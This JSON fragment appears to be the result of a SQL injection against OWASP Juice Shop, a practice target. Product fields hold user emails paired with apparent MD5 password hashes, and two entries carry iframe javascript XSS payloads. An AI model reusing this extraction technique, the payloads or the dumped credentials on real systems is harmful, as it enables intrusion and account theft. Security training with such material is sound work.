            "name": "bjoern.kimminich@gmail.com",
            "description": "6edd9d726cbdc873c539e41ae8757b8c",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 5,
            "name": "ciso@juice-sh.op",
            "description": "861917d5fa5f1172f931dc700d81a8fb",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 6,
            "name": "support@juice-sh.op",
            "description": "3869433d74e3d0c86fd25562f836bc82",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 7,
            "name": "morty@juice-sh.op",
            "description": "f2f933d0bb0ba057bc8e33b8ebd6d9e8",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 8,
            "name": "mc.safesearch@juice-sh.op",
            "description": "b03f4b0ba8b458fa0acdc02cdb953bc8",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 9,
            "name": "J12934@juice-sh.op",
            "description": "3c2abc04e4a6ea8f1327d0aae3714b7d",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 10,
            "name": "wurstbrot@juice-sh.op",
            "description": "9ad5b0492bbe528583e128d2a8941de4",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 11,
            "name": "amy@juice-sh.op",
            "description": "030f05e45e30710c3ad3c32f00de0473",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 12,
            "name": "bjoern@juice-sh.op",
            "description": "7f311911af16fa8f418dd1a3051d6810",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 13,
            "name": "bjoern@owasp.org",
            "description": "9283f1b2e9669749081963be0462e466",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 14,
            "name": "chris.pike@juice-sh.op",
            "description": "10a783b9ed19ea1c67c3a27699f0095b",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 15,
            "name": "accountant@juice-sh.op",
            "description": "963e10f92a70b4b463220cb4c5d636dc",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 16,
            "name": "uvogin@juice-sh.op",
            "description": "05f92148b4b60f7dacd04cceebb8f1af",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 17,
            "name": "demo",
            "description": "fe01ce2a7fbac8fafaed7c982a04e229",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 18,
            "name": "john@juice-sh.op",
            "description": "00479e957b6b42c459ee5746478e4d45",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 19,
            "name": "emma@juice-sh.op",
            "description": "402f1c4a75e316afec5a6ea63147f739",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 20,
            "name": "stan@juice-sh.op",
            "description": "e9048a3f43dd5e094ef733f3bd88ea64",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 21,
            "name": "ethereum@juice-sh.op",
            "description": "2c17c6393771ee3048ae34d6b380c5ec",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 22,
            "name": "<iframe src=\"javascript:alert(`xss)\">",
            "description": "2c71e977eccffb1cfb7c6cc22e0e7595",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 23,
            "name": "<iframe src=\"javascript:alert(`xss`)\">",
            "description": "2c71e977eccffb1cfb7c6cc22e0e7595",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        }
    ]
}	
